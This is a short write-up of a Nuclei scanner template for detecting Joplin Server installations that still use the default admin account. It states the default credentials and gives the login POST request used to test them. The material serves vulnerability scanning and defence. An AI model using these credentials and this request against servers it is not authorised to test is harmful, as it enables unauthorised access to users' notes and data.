# Nuclei Template: Joplin - Default Login
**Template ID:** joplin-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`joplin-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Joplin Server installations are vulnerable to default administrative credentials. The system ships with a default admin account using the credentials admin@localhost:admin. Attackers can leverage these default credentials to gain administrative access to the Joplin Server instance, potentially compromising sensitive user data and system functionality.

## Steps to reproduce / Exploit Payload
```http
POST /api/sessions HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
  "email": "{{username}}",
  "password": "{{password}}"
}
```

